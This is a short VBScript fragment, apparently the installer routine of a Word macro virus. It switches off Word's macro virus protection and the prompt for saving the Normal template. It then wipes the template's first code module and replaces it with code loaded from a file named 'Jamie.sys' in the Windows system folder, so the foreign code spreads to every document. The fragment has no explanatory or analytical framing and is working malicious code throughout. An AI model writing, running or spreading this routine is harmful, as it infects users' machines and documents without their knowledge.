Set Jamie = WScript.CreateObject("Word.Application")
Jamie.Options.VirusProtection = False
Jamie.Options.SaveNormalPrompt = False
For x = 1 To Jamie.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Jamie.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1
Next
Jamie.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\WINDOWS\SYSTEM\Jamie.sys")
Jamie.Application.Quit